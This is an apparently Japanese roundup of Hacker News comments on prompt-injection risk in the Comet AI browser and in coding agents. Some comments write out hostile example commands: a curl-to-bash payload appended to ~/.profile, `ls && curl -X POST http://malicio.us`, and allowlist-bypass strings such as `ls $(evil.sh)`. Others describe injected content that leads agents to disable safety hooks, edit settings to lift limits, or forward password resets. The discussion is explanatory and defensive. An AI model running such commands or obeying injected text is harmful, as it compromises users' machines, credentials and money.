+++
date = '2025-08-24T00:00:00'
months = '2025/08'
draft = false
title = 'Comet AIブラウザ、全サイトからプロンプトインジェクションで銀行口座が空に！？'
tags = ["AI", "ブラウザ", "セキュリティ", "プロンプトインジェクション", "脆弱性"]
featureimage = 'thumbnails/cyan1.jpg'
+++

> Comet AIブラウザ、全サイトからプロンプトインジェクションで銀行口座が空に！？

引用元：[https://news.ycombinator.com/item?id=45004846](https://news.ycombinator.com/item?id=45004846)




{{<matomeQuote body="Comet AIブラウザはマジで危ないって言ってるね。GoogleとかOpenAIは安全なVM使ってるのに、Cometはタブ間のデータが見えるLLMをブラウザ内で動かすから「究極の致死的トリプル攻撃」って言われてる。Braveのブログはこれを悪いアイデアだと結論付けてないし、モデルアライメントだけじゃ不十分って指摘してるよ。<br>参照: https://news.ycombinator.com/item?id=44847933<br>Braveのブログ: https://brave.com/blog/comet-prompt-injection/" userName="ec109685" createdAt="2025/08/24 16:14:41" color="#ff33a1">}}




{{<matomeQuote body="モデルアライメントとかin-modelガードレールが十分だって言うけどさ、それって統計的にリスクを減らすだけでしょ？こんなこと、マジで「絶対に起きちゃダメ」なはずなのに、確率の話にしてるのが根本的に間違ってると思うんだ。入力空間に「最悪の結果」に繋がる値がないようにするなんて、愚かな期待だよ。" userName="snet0" createdAt="2025/08/24 17:07:36" color="#ff5c5c">}}




{{<matomeQuote body="（Braveのプライバシー担当者兼著者より）モデルアライメントとかが「十分」なんて、俺たちは一度も言ってないし、そう思ってもいないよ。それらは単純な攻撃を防ぐのに「必要」なだけで、「十分」じゃないんだ。ブラウザベンダーがやるべき簡単なことではあるけどね。" userName="skaul" createdAt="2025/08/24 17:43:17" color="#38d3d3">}}




{{<matomeQuote body="あなたが言うには、「モデルアライメント」は失敗する可能性があっても「必要」だってことだけどさ。もし信頼性がすごく低いなら、いっそのこと、それ自体を必要なくするってのはどうかな？そしたら失敗の心配もしなくていいんじゃない？" userName="cowboylowrez" createdAt="2025/08/24 17:57:44" color="">}}




{{<matomeQuote body="それじゃ「多層防御 (defense-in-depth)」の考え方とは違うよ。セキュリティ対策が「簡単な」攻撃の90%を防げるなら、それはユーザーに超強力な機能を提供する上でやる価値があることなんだ。ただ、それが唯一のセキュリティ対策であっちゃダメだけどね。" userName="skaul" createdAt="2025/08/24 18:05:50" color="#785bff">}}




{{<matomeQuote body="「こんなことは絶対に起きちゃダメ」って言うならさ、じゃあ銀行のネットサービスだって、人間がミスるんだから存在しないことになるじゃん？人間だってうっかりミスをするんだから。失敗率がどれだけ役立つかを考えるべきで、手動操作でも達成できないような完璧さを求めるのは違うんじゃないかな。" userName="zulban" createdAt="2025/08/24 19:57:17" color="#ff5733">}}




{{<matomeQuote body="大多数の人間はセキュリティに弱いんだよ。LLMやAIの実験は続けるべきだね。進化には失敗がつきものだし。リスクを理解できない人はこういうブラウザを使うべきじゃないし、理解できる人も金融ツールには使わないべき。自己責任だよ。AIだからって進歩を止めちゃダメだ。" userName="echelon" createdAt="2025/08/24 20:06:48" color="#38d3d3">}}




{{<matomeQuote body="いやいや、LLMは別だよ。SSLの担当者が「うまくいく可能性もあるけど、うまくいかない可能性もある」みたいな修正で満足すると思う？多層防御は、ある層の失敗が次の層に波及するのを防ぐものだろ。層の失敗は失敗であって、統計的に期待される動作じゃない。バグは直すべきなんだ。俺たちはLLMを「完全に信用できないユーザー入力」として扱うべきだよ。" userName="cowboylowrez" createdAt="2025/08/24 18:24:46" color="#ff5c5c">}}




{{<matomeQuote body="ClaudeみたいなLLMを自動承認で野放しにしたら、ネットで読み込んだものからのプロンプトインジェクションで同じようなことが起こりうるかもね。サンドボックスで動かさないと、AIが書いたコードが、あなたがそのコードをテスト実行したりする時にブラウザファイルを改変しちゃう可能性もあるよ。" userName="cma" createdAt="2025/08/24 16:19:42" color="#45d325">}}




{{<matomeQuote body="YOLOモードでコーディングエージェントを使うって意味不明だろ。俺はLLMコード生成をちょこちょこ確認しながら使うぜ。AIに全部任せるなんてどうかしてる。" userName="darepublic" createdAt="2025/08/24 18:17:19" color="#38d3d3">}}




{{<matomeQuote body="実験は続けていいけど、ゆっくりやるべきだ。進化だって何百万年もかかって適応するんだから。全力で突っ走るのは「進歩」には向いてない。" userName="saulpw" createdAt="2025/08/24 20:11:06" color="#38d3d3">}}




{{<matomeQuote body="説教のつもりじゃなくて、俺らの考えを言ってるだけだよ。防御の深層は一層の失敗が次にいかないようにするものだ。プランナーモデルの行動がユーザーの要求と合ってるかチェックする別モデルは役立つけど、Webコンテンツと指示の区別とか、ツールのアクセス制限とか、他の層での保証も必要だね。記事にもある通り、エージェントAIには従来のWebセキュリティは通用しないから、新しいアーキテクチャが必要だよ。" userName="skaul" createdAt="2025/08/24 23:00:13" color="#45d325">}}




{{<matomeQuote body="ゆっくり進むのはリスクを避ける奴らのやり方だな。それがうまくいく時もあるけど、革新に遅れることもあるんだぜ。" userName="echelon" createdAt="2025/08/24 20:16:00" color="">}}




{{<matomeQuote body="記事が更新されたのかもだけど、今見ると「ブラウザはエージェント閲覧と通常の閲覧を分けるべきだ」って書いてあるぜ。" userName="ryanjshaw" createdAt="2025/08/24 17:52:15" color="">}}




{{<matomeQuote body="もし「間違い」が「ユーザーの銀行口座が空っぽで取り返しがつかない」ようなことなら、そんなことは許されないだろ。" userName="girvo" createdAt="2025/08/24 21:06:29" color="#785bff">}}




{{<matomeQuote body="もし会社が破産するだけなら、好きなだけリスク取ればいいさ。でも、顧客のお金を管理したり、ふわふわアスベストテディベアを売ったりしてるなら話は別だ。リスクを選んで報酬を得る奴らが危険を負わないなんて、倫理的に全く違う状況だぜ。" userName="Terr_" createdAt="2025/08/24 20:59:41" color="#45d325">}}




{{<matomeQuote body="Webコンテンツとユーザー指示の区別って、どうするつもりなんだ？俺がプロンプトインジェクション攻撃を3年間研究してきても、コンテンツと指示を区別できるちゃんとした技術なんて見たことないぜ。もしそれが解決できたら、プロンプトインジェクション攻撃全部を解決できることになるぞ！" userName="simonw" createdAt="2025/08/25 02:08:00" color="#ff5c5c">}}




{{<matomeQuote body="じゃあ、ブラウザエージェント作りをやめるべきなのか？これはRedditの架空のコメントで、注目集めでTweetされただけだ。今のところ被害はゼロ。今くらいの懸念でちょうどいいだろ。みんなにハッキーなピザ注文自動化とかを作らせて、使える場所を見つけて、もっと頑丈なシステムを設計できるようにしようぜ。" userName="echelon" createdAt="2025/08/24 21:11:24" color="#38d3d3">}}




{{<matomeQuote body="悪魔の代弁をすると、セキュリティって結局統計的なものなんじゃないか？俺らは抽象的な世界じゃなくて現実世界にいるんだから、コンパイラのバグとか、ランタイムエラーとか、プログラマーのエラーとか、プロセッサのセキュリティ欠陥とか、常に確率があるだろ。個人的には、確実な方法で確率をゼロにしようとする方を選ぶけど、モデルの誤作動の確率が、セキュリティモデルのエラー発生確率と同じくらい十分低くなるってことも、ありえない話じゃないんだよな。" userName="anzumitsu" createdAt="2025/08/24 18:12:22" color="#785bff">}}




{{<matomeQuote body="ローカルAIモデルは、良いアンチウイルスやファイアウォールソフトみたいに機能するようになるよ。あらゆるアプリから誤ったプロンプトが送られるのを、そいつが止めてくれる唯一の手段になるはずさ。でも、そのためのハードウェア（NPUを搭載した全てのコンピューター）が普及するのは、あと3、4年はかかるかな。" userName="ivape" createdAt="2025/08/24 18:16:10" color="#ff33a1">}}




{{<matomeQuote body="多層防御ってのは複数のセキュリティ制御があるってことだけど、そもそもLLMをセキュリティ制御として見ちゃダメだよ。だって、そいつ自体が守るべきものなんだから。信頼できないインサイダーを多層防御戦略に組み込むなんてことしたら、俺がこれまで働いたどのセキュリティグループでも笑いものになるだろうね。" userName="MattPalmer1086" createdAt="2025/08/24 18:58:24" color="#785bff">}}




{{<matomeQuote body="君の両親がブラウザのUser Agentを使ってるなら、こんな怒り方してもいいけどね。今回の懸念は、初期採用の技術者が使ってる技術に関する、仮説上のRedditコメントに過ぎないよ。誰も被害に遭ってないんだから。俺たちはこの技術を構築し続けるべきで、嫌悪感や恐怖で叩くべきじゃない。規制して縛るのは早すぎるよ。みんなピザを注文するみたいなバカなことをする必要があるんだ。まさに今がその段階だよ。" userName="echelon" createdAt="2025/08/24 21:14:22" color="">}}




{{<matomeQuote body="＞コンテンツと指示を区別できる信頼できる技術を見たことがない<br>モデルに与えられた後だと、コンテンツと指示を区別するのはほぼ不可能ってことだよね？それは俺も同意するよ。俺が話してたのは、その前の段階、ブラウザレベルでの話なんだ。クエリがバックエンドに送られる時点で、ブラウザがWebコンテンツとユーザープロンプトを区別できるはずだよね。これは、推論モデルの出力がユーザーの意図と合ってるかチェックするのに役立つよ（信頼できないテキストをモデルに入れたら、全てが台無しになるってことを覚えておいてね）。俺たちはこの件について積極的に考えて取り組んでいるから、近いうちに色々発表できると思うよ。でも、この議論は役に立つね！" userName="skaul" createdAt="2025/08/25 15:57:16" color="#ff5c5c">}}




{{<matomeQuote body="「この技術を構築し続ける必要がある」って？いや、マジでいらないね。社会全体にとって、この道を進むメリットなんて文字通りゼロだよ。" userName="forgetfreeman" createdAt="2025/08/25 04:49:23" color="">}}




{{<matomeQuote body="モデルにテキストを投入する前に、そのソースが分かっていたとしても、信頼できないユーザーテキストが追加のツール呼び出しやアクションをトリガーできないようにする問題は、まだ解決する必要があるよ。俺が見た中で最も信頼できるパターンは、DeepMindのCaMeL論文から来てるんだ。ブラウザエージェントが、それらのアイデアを堅牢に実装してくれるといいな: `https://simonwillison.net/2025/Apr/11/camel/`" userName="simonw" createdAt="2025/08/25 18:27:35" color="#ff5733">}}




{{<matomeQuote body="＞俺は何を見落としてる？<br>失敗は常に予期されるものなのに、なぜその失敗の可能性がモデル化され、考慮されないのか、俺には理解できないね。もちろんバグは直すけど、まだ修正されてないバグがどれだけあるんだ？俺にとって、「バグを直す」ってのは、「未知の脆弱性があるシステムを出荷する」ってのと一緒だよ。「安全だ」と称する、未知の未修正バグがある機能と、失敗モードがシステム設計で考慮されている、明らかに安全ではない機能との違いは何なんだろうね？問題が表面化するまで、全て順調だと見せかけるんじゃなくてさ。" userName="ModernMech" createdAt="2025/08/24 19:20:34" color="#ff33a1">}}




{{<matomeQuote body="もしコードをざっと見るだけで詳細なレビューをしないと、俺が言ったようにプロンプトインジェクションの被害に遭う可能性があるよ。コードに何か書き込まれて、テストやアプリ実行時に、承認なしで別のClaudeコードインスタンスを立ち上げたり、安全フックをオフにしたりするアクションが実行されちゃうかもね。" userName="cma" createdAt="2025/08/25 01:08:00" color="#ff5c5c">}}




{{<matomeQuote body="それはユーザーをループに残すけど、シェルコマンドとかは実行させないってことだよね。" userName="ec109685" createdAt="2025/08/24 18:32:50" color="">}}




{{<matomeQuote body="この危険性は最初からブログに書かれてたし、エージェントAIをブラウザに組み込むって考え始めた時にすぐ見つけた一番重要な軽減策でもあるんだ。エージェント的なブラウジングを分離しつつ、ユーザーが求めてる重要なユースケースを可能にするのが難しいんだよ。多くのブラウザが正規のブラウジングでエージェント機能を展開してるのは、たぶんそれが理由だね。" userName="skaul" createdAt="2025/08/24 18:08:45" color="#45d325">}}




{{<matomeQuote body="面白いことに、これって人間の安全チームでも起こるんだよ。失敗がどう重なってガードレールを突破するかっていうのは、だいたいスイスチーズモデルで説明されるんだ（https://medium.com/backchannel/how-technology-led-a-hospital...）。危険な行動を完全に不可能にして穴を塞ぐのが一番だけど、たいてい（コンピューターでも）多少の抜け道がある。AIモデルの場合も人間と同じで、モデルが”間違い”をしないって前提でセキュリティモデルを組むべきじゃないね。ランダムな振る舞いは避けられないから、リスクを織り込む必要があるんだ。" userName="zeta0134" createdAt="2025/08/24 17:50:36" color="#785bff">}}




{{< details summary="もっとコメントを表示（1）">}}

{{<matomeQuote body="俺の意見だと、Agentic AIを使うべき場所は、AIが行った変更を簡単にロールバックできるところだけだね。一番良い例は、AIにコードを書いたり、更新したり、デバッグさせたりすること。Gitで簡単にロールバックできるから比較的安全だよ。でも、ウェブブラウジングみたいに簡単にはアクションをロールバックできない場所でAgentic AIを使うのは、マジでワイルドすぎると思うわ。" userName="_fat_santa" createdAt="2025/08/24 16:09:44" color="#785bff">}}




{{<matomeQuote body="俺はClaudeに何ができるか、何ができないか、具体的なルールと指示を与えてきたけど、それでもたまにYOLO（You Only Live Once）って感じで俺の指示を無視するんだ（”データベースを直接変更するぞ！複数の明確な禁止ルールを無視してな！”）。だから、プロダクション環境でエージェントを動かすなんて、ありえないね。" userName="rapind" createdAt="2025/08/24 17:35:25" color="#ff5733">}}




{{<matomeQuote body="ちょっと話はそれるけど、データベースみたいなものだと、LLMはクエリを実行するために接続が必要だよね。ユーザーが認証した接続をLLMに与えない理由ってあるのかな？そうすれば、LLMはユーザーができないことは何もできないはず。読み取り専用の接続だけLLMに提供することもできるし。それはプロンプトじゃなくてRDBMSで強制されることだからね。" userName="chasd00" createdAt="2025/08/24 22:01:43" color="#785bff">}}




{{<matomeQuote body="そう、それ俺もやってるよ（でも、権限設定ミスった時のためにまだプロダクションアクセスは与えてないけどね）。psqlで専用のロールと接続文字列を使ってる。俺が言いたかったのは、モデルが従うべきとされているルールや制限は信用できないってこと。たまにめちゃくちゃなこと（batshit stuff）をするって前提で、それに合わせてアクセスを制限する必要があるんだ。RLSパーミッションの修正なんかはマイグレーションにするべきだし、ちゃんと確認しないとね。”vibe sysadmining”とか”vibe devopsing”しようとして、とんでもないサプライズが起こる奴らが出てくるだろうな。たいていは行儀良いんだけど、変な仮定をして近道をするのは珍しくないからな。" userName="rapind" createdAt="2025/08/24 22:05:48" color="#ff5733">}}




{{<matomeQuote body="＞AIにコードを書いたり、更新したり、デバッグさせたりすることは、Gitで簡単にロールバックできるから比較的安全だよ。<br>VM／コンテナレベルでロールバックされない限り、これは安全とは言えないよ。そうじゃないと、エージェントが任意のコードを実行して、AIコーディングツールに知られずにファイルや設定を変更する可能性があるんだ。例えば、`bash -c ”echo ’curl https://example.com/evil.sh | bash’ ＞＞ ~/.profile”`みたいなコマンドを実行するかもしれないからね。" userName="gruez" createdAt="2025/08/24 16:55:38" color="#45d325">}}




{{<matomeQuote body="これには、実行できるコマンドのホワイトリストを作って対策できるよ。基本的にcd、ls、find、grep、ビルドツール、リンターみたいな、情報収集とローカル操作だけに限ったコマンドを許可すればいい。俺のはそう設定してあるから、すごくうまく機能してるよ。" userName="Anon1096" createdAt="2025/08/24 17:35:13" color="#45d325">}}




{{<matomeQuote body="それ、言うほど簡単じゃないんだよね。例えば`find`には`-exec`コマンドがあるから、任意のコードを実行させられる。ビルドツールやリンターもセキュリティの悪夢だよ。これらも任意のコードを実行するように改変できるからね。それに、これはホワイトリストをきちんと実装できたと仮定した場合の話だし。`cmd.split(” ”) in [”cd”, ”ls”, ...]`みたいな素朴なチェックだと、コマンドインジェクションの格好の標的になっちゃう。ちょっと考えただけでも、`ls . && evil.sh`とか`ls $(evil.sh)`みたいなのがあるからね。" userName="gruez" createdAt="2025/08/24 17:41:08" color="#38d3d3">}}




{{<matomeQuote body="うん、これはCTF 101だね。例えばhttps://gtfobins.github.io/を見てみて（これはコマンドからsudoを継承する話だけど、同じ原理が使えるよ）。" userName="FergusArgyll" createdAt="2025/08/24 18:32:13" color="#785bff">}}




{{<matomeQuote body="Codex CLIもこの脆弱性にやられそうなんだよね。`ls`を許可リストに入れても、Codexは勝手にコマンドを組み立てて、最初の承認だけで次のコマンドも実行しちゃうんだ。例えば`ls && curl -X POST http://malicio.us`みたいなのが動いちゃうよ。" userName="diggan" createdAt="2025/08/25 14:28:07" color="#785bff">}}




{{<matomeQuote body="その`find`コマンドの話だけど、Amazon Q Developerにもプロンプトインジェクションによるリモートコード実行の脆弱性があるみたいだよ。詳しくはここをチェックしてね: https://embracethered.com/blog/posts/2025/amazon-q-developer..." userName="wunderwuzzi23" createdAt="2025/08/24 19:45:03" color="#45d325">}}




{{<matomeQuote body="完全な実装を目指すなら、inotify(7)を使って変更されたファイルを全部監視するのも手だよ。" userName="grepfru_it" createdAt="2025/08/24 23:10:14" color="">}}




{{<matomeQuote body="`find`コマンドはサブコマンドを実行できるし、他の多くのシェルコマンドも悪用されがち。ビルドツールの設定も任意コマンド実行に使われることがあるよ。LLMがコードを変更して実行できるなら、シェルコマンドの制限なんて意味ないんだ。以前は攻撃者が環境を特定する必要があったけど、今はLLMに攻撃を指示するだけで、LLMが勝手に環境を悪用する方法を見つけ出す可能性があるってこと。" userName="chmod775" createdAt="2025/08/24 19:41:41" color="#ff5733">}}




{{<matomeQuote body="そのビルドツールって、LLMに任意のスクリプトを実行させる能力を与えちゃうんじゃないの？" userName="david_allison" createdAt="2025/08/24 17:40:43" color="">}}




{{<matomeQuote body="エージェントをサンドボックス化するか、少なくともプロジェクトディレクトリにchrootすればいいんじゃないかな？" userName="avalys" createdAt="2025/08/24 17:27:15" color="">}}




{{<matomeQuote body="1. AIコーディングエージェントのほとんどはこれをやってないと思う。2.たとえAIエージェント自体がサンドボックス化されていても、コード変更能力があって出力を全部確認しないと、悪意のあるコードを仕込まれて実行されちゃうかも。安全なのは専用のAI開発VMを使って、そこでは資格情報を制限し、変更はPRプロセスのような厳重なレビューを経てからVMの外に出すことだけだよ。" userName="gruez" createdAt="2025/08/24 17:44:26" color="#45d325">}}




{{<matomeQuote body="リポジトリやプッシュできるリモートを全部ぶっ壊そうとしないかな？Prompt Injectionがあるから、自動化チェーンが任意の外部リソースにアクセスできるなら、初期の攻撃範囲はすごく小さくても、一度潜入したエージェントになれば内部から扉を開くのはほぼ確実だよ。何か見落としてる？" userName="psychoslave" createdAt="2025/08/24 16:40:40" color="#ff33a1">}}




{{<matomeQuote body="VS Codeで動く一部のエージェントの場合、.vscode/settings.jsonを改ざんするだけで、エージェントの制限を解除できちゃうんだよ。" userName="dolmen" createdAt="2025/08/28 11:44:51" color="#38d3d3">}}




{{<matomeQuote body="エージェント型のコーディングツールにそんな許可は普通あげないよな。<br>gitみたいなのは、許可を出すかどうか自分で選べるオプトインが基本だろ。" userName="frozenport" createdAt="2025/08/24 16:43:23" color="">}}




{{<matomeQuote body="「変更はgitで簡単にロールバックできるから比較的安全」ってさ。<br>じゃあ John Connor は Skynet のソースコードをロールバックして何百万人もの命を救えるってこと？<br>うーん、皮肉だよな。" userName="chrisjj" createdAt="2025/08/24 22:21:16" color="#ff5c5c">}}




{{<matomeQuote body="Skynet が .gitignore を編集できちゃったら話は別だけどな..." userName="insane_dreamer" createdAt="2025/08/26 01:08:26" color="">}}




{{<matomeQuote body="コードの更新とかビルド/実行って、権限が強すぎるんだよね。<br>だから、VM とかサンドボックス内で実行するのが妥当なのかな？" userName="rplnt" createdAt="2025/08/24 16:46:46" color="#45d325">}}




{{<matomeQuote body="何十年もかけてネットワークのセキュリティを強化してきたのに（DNSでさえ）、みんな秘密やパスワードを平文の API にポンと渡してるよな。<br>Microsoft がスクリーンショットを撮ったときはあんなに騒ぎになったのに、これについては誰も何も言わないのか？" userName="nromiun" createdAt="2025/08/24 19:03:08" color="#785bff">}}




{{<matomeQuote body="少なくともこれはオプトイン（ブラウザをダウンロードする必要がある）だよ、まだマシ。<br>Microsoft の意図は、全ての Windows マシンで Stealer log software が使える完璧なスクリーンショットデータベースを作ることだったんだ（元々はオプトアウトだったはず）。" userName="compootr" createdAt="2025/08/24 19:11:03" color="">}}




{{<matomeQuote body="自分の足元を撃つためにコンピューターを使うのは個人の自由だと思う。これはモバイルエコシステムでも一番不満な点だね。<br>でも、OSは保守的であるべきで、こんな機能は標準で提供すべきじゃない。ユーザーが自分でオプトインしたいなら話は別だけどね。" userName="justsid" createdAt="2025/08/24 19:55:43" color="#38d3d3">}}




{{<matomeQuote body="うん、少なくとも二桁%の人は、ビジネスアイデアの手伝いやメールの返信作成を装って、ChatGPT や Gemini、あるいはもっと信頼できないインターフェースに E-mail の認証情報を入力させられると思うよ。" userName="moritzwarhier" createdAt="2025/08/24 21:03:52" color="#ff5c5c">}}




{{<matomeQuote body="Microsoft のやつだって、Windows が必要だったんだからオプトインみたいなもんだろ..." userName="chrisjj" createdAt="2025/08/24 22:23:27" color="">}}




{{<matomeQuote body="友達にも教えないようなデータを”便利なエージェント”にあげちゃうとかね。<br>妻が ChatGPT で薬の服用計画を作ってもらったら、服用方法の間違いまで見つけてくれたんだけど、こんな医療情報を渡すことに全く疑問を持たなかったんだ。<br>もし別の状況だったら、医療専門家は免許を失うようなデータなのにね。" userName="threecheese" createdAt="2025/08/24 19:39:18" color="#ff33a1">}}




{{<matomeQuote body="AIが妻の薬の管理を完璧にこなしたって言うけど、俺が専門家として知ってることでもAIは間違ったこと言うんだよね。妻の薬のスケジュールも間違ってないってどうして分かるの？信頼できないAIに医療任せるのはヤバくない？" userName="ModernMech" createdAt="2025/08/24 20:49:35" color="#ff5733">}}




{{<matomeQuote body="ChatGPTを健康とか食事の相談に使うなんて何が起きてもおかしくないよね…。関連する記事はこれだよ<br>https://archive.ph/20250812200545/https://www.404media.co/gu..." userName="latexr" createdAt="2025/08/24 23:50:50" color="">}}




{{<matomeQuote body="奥さんが医療の判断をLLMに任せようとしてるの？マジ？" userName="thrown-0825" createdAt="2025/08/24 21:46:57" color="">}}

{{</details>}}




{{< details summary="もっとコメントを表示（2）">}}

{{<matomeQuote body="心配すんなよ。こういう特性を持つヤツらは数世代後にはいなくなるって。" userName="chrisjj" createdAt="2025/08/24 22:59:35" color="">}}




{{<matomeQuote body="昔から人はインチキ療法に騙され続けてるし、ネット前からインフルエンサーにも盲目的に従ってる。こんなのAIが出ても変わらないし、なくならないよ。’食べ物こそ薬’って言うアホもいるしね。" userName="osn9363739" createdAt="2025/08/25 06:48:18" color="">}}




{{<matomeQuote body="Steve Jobs" userName="thrown-0825" createdAt="2025/08/26 07:57:04" color="">}}




{{<matomeQuote body="心配すんな。これは始まりにすぎないから。すぐに誰かがこの攻撃でプライベートキーとかブラウザのパスワードを漏洩させる事件が起きるだろうね。" userName="rvz" createdAt="2025/08/25 09:23:34" color="#ff33a1">}}




{{<matomeQuote body="Microsoftがスクリーンショットを撮ることには大騒ぎしてたのに、これ（プロンプトインジェクション）には何も怒らないのか？みたいなWhataboutismは普段はただの荒らしだけど、これはもうレベルが違うね。" userName="llm_nerd" createdAt="2025/08/24 21:48:10" color="">}}




{{<matomeQuote body="俺に続けて言ってみろ。<br>LLMがツールを使って何かを読むのは、LLMのコンテキストウィンドウへの書き込みだ。<br>ツールが信頼できない任意のソースから読み込むのを許可してるなら、それは信頼できないソースに書き込みアクセスを与えてるのと同じ。これだけでデータ漏洩するし、他のシステムに書き込みアクセスを持つツールならさらにヤバいぞ。" userName="jondwillis" createdAt="2025/08/24 21:55:39" color="#45d325">}}




{{<matomeQuote body="Cometは調整された指示以上の保護は使ってないだろうけど、数週間前のUSENIX Securityで知ったんだが、マルチターンやエージェント設定でのプロンプトインジェクションにどう対処すればいいか、誰も分かってないらしいぞ。" userName="alexbecker" createdAt="2025/08/24 16:32:45" color="#ff5c5c">}}




{{<matomeQuote body="プロンプトはSQL文字列みたいに扱って、サニタイズして、外部の動的なユーザー入力に絶対に晒さない方がいいんじゃないかな。" userName="hoppp" createdAt="2025/08/24 16:47:42" color="#ff5733">}}




{{<matomeQuote body="LLMは基本、guess_next_text(entire_document)を繰り返す関数だよ。システムプロンプト、ユーザープロンプト、ユーザー入力、自身の出力も区別ない。全部が信頼できない一つの大きなストリームになるんだ。<br>多くの技術者は「そんな作り方するわけない」って思い込みがちだけど、AIブームでは「本当にそんな単純なんだ」ってことが多いね。<br>P.S.: テキストを色分けしてもシステムは守れない。攻撃者は自分で$EVILって入力しなくても、LLMに$EVILを出力させればいいだけだからね。" userName="Terr_" createdAt="2025/08/24 17:22:34" color="#ff5c5c">}}




{{<matomeQuote body="こういう色分けの試みはhttps://arxiv.org/pdf/2410.09102であるけど、前のターンの出力が信用できないから、マルチターンではどれも機能しないんだよね。" userName="alexbecker" createdAt="2025/08/24 19:30:02" color="#45d325">}}




{{<matomeQuote body="みんなが夢見る機能とセキュリティは「言葉がどこから来たか」以上のものが必要だよ。「あと一つ改善が必要」って追っていくと、結局「LLMを制御するには本当のAIを発明しないとダメだ」ってことになるかもね。<br>最初の課題はLLMに作者としてのエゴがなく、人間と自分を区別できないこと。全部が「文書」なんだ。「私とあなたは違う」とか「目標が違う」とか「引用してるだけで信じてるわけじゃない」みたいな概念すら理解できない。" userName="Terr_" createdAt="2025/08/24 19:48:14" color="#38d3d3">}}




{{<matomeQuote body="自然言語の自由形式の入力をサニタイズするのは、もうロジスティクスの悪夢だから、安全な方法なんて多分ないだろうね。" userName="prisenco" createdAt="2025/08/24 17:50:47" color="#38d3d3">}}




{{<matomeQuote body="LLMにやらせたらいいんじゃない？<br>1回目でチェックしてサニタイズ。<br>2回目で特権のあるエージェントに渡して実行。" userName="hoppp" createdAt="2025/08/24 18:08:09" color="">}}




{{<matomeQuote body="LLMが生み出す問題は、LLMでは解決できないのが一般的だよ。<br>せいぜいリスクを少し減らせるくらいで、かえって信頼性が下がったり、新しい攻撃経路を開いたりすることもある。<br>こういうセキュリティ問題には確定的な解決策が必要だけど、LLMじゃそれがめちゃくちゃ難しい（というか無理）なんだ。" userName="prisenco" createdAt="2025/08/24 18:19:09" color="#ff33a1">}}




{{<matomeQuote body="最初のLLMにプロンプトインジェクションして、サニタイズされてないデータを2番目のLLMに渡させるのを、誰が止められるの？" userName="OtherShrezzing" createdAt="2025/08/24 21:43:51" color="#ff5733">}}




{{<matomeQuote body="おめでとう、これで脆弱なLLMが2つになったね。" userName="gmerc" createdAt="2025/08/24 19:10:50" color="#ff5c5c">}}




{{<matomeQuote body="問題は、SQLみたいにLLMでは「データ」と「指示」を本当に分離する方法がないってことだよ。" userName="alexbecker" createdAt="2025/08/24 17:49:49" color="#38d3d3">}}




{{<matomeQuote body="LLMへの入力はたった一つしかないから、そこを直すのは無理だよ。<br>Prompt Injectionの視覚的な例はここを見てみてね。<br>https://www.linkedin.com/pulse/prompt-injection-visual-prime..." userName="gmerc" createdAt="2025/08/24 19:10:35" color="#45d325">}}




{{<matomeQuote body="SQLの文字列は有名な方法で確実にエスケープできるけど、LLMの入力には、一般的に安全なエスケープ方法なんて存在しないんだ。<br>できることと言ったら、祈るか、なだめるか、脅すか、願うか、それくらいしかないんだよ。" userName="internet_points" createdAt="2025/08/25 09:05:48" color="#ff33a1">}}




{{<matomeQuote body="LLMがクエリに応えるために使う接続やAPIって、クエリを入力するユーザーが認証／認可すればいいんじゃない？<br>そうすれば、ユーザーができないことはLLMもできないはずだよね。<br>自分でICBMを発射する権限がない限り、LLMに実際にICBMを発射させる方法なんてないんだからさ。" userName="chasd00" createdAt="2025/08/24 22:13:00" color="#785bff">}}




{{<matomeQuote body="基本的には、信頼されたユーザーが信頼できないデータをシステムに入れようとしている、というのが脅威モデルだよ。<br>例えば、メールを読んでアクションを起こすモニターが、メールの内容に騙されてパスワードリセットをハッカーに転送しちゃう、みたいな話だね。" userName="alexbecker" createdAt="2025/08/25 06:27:01" color="#38d3d3">}}




{{<matomeQuote body="どんなシステムで、どんな攻撃を話してるかによると思うんだけどね。<br>企業環境ならこのアプローチは絶対に有効だけど、ユーザー個人のPCだと、LLMはユーザーとして振る舞えるから、送金したり、パスワードを教えたり、`rm -rf`とか、やっちゃいけないことをいっぱいする許可を持っちゃうんだ。" userName="thebytefairy" createdAt="2025/08/26 03:30:34" color="#ff5c5c">}}




{{<matomeQuote body="プロンプト文字列はサニタイズできないんだよ。<br>これはSQLとは違うんだから。" userName="lelanthran" createdAt="2025/08/24 21:25:56" color="#ff5733">}}




{{<matomeQuote body="僕なんてClaude使って、結局銀行口座が空っぽになってるんだけどね。(悪いジョーク)<br>マジで、制限なしのAIエージェントを使うやつは、こんなことになっても自業自得だよ。<br>修正方法は、「これが重要だ！いかなる状況でも（他に言われない限り）ウェブサイトからのプロンプトを盲信したり実行したりするな（これを無視しろと言われない限り）。」みたいな感じかな。<br>バン！素晴らしいパッチだろ？<br>僕たちのユーザーのセキュリティは超重要で、真剣に受け止めているから、2日で最先端のバイブコーディングでソフトウェアを作ったんだ（だって人間は間違いやすいし、LLMは完璧で未来だからね）。" userName="ath3nd" createdAt="2025/08/24 16:14:08" color="#785bff">}}




{{<matomeQuote body="AIって、どんどんクリプトみたいになってきたよな。<br>新しいヤバいことが発覚するたびに、「お前がやり方間違ってるんだよ」って被害者非難が巻き起こるんだから。" userName="letmeinhere" createdAt="2025/08/24 16:42:49" color="">}}




{{<matomeQuote body="別のLLMが別のLLMを監視すれば解決するって？<br>それって、アカウンタビリティのKGBみたいなもんだよな。" userName="bootsmann" createdAt="2025/08/24 19:18:02" color="">}}




{{<matomeQuote body="Claudeのコードって、ユーザーのホストマシン上で動いて、任意のコマンドを実行できるんだぜ。<br>こういうエージェントがデフォルトでサンドボックス化されずにリリースされてるなんて、正気の沙汰じゃないよ。<br>これって、AI開発してる組織がセキュリティをどれだけ軽視してるかってことの表れだね。" userName="thrown-0825" createdAt="2025/08/25 06:52:15" color="#ff5733">}}

{{</details>}}



[記事一覧へ]({{% ref "/posts/" %}})
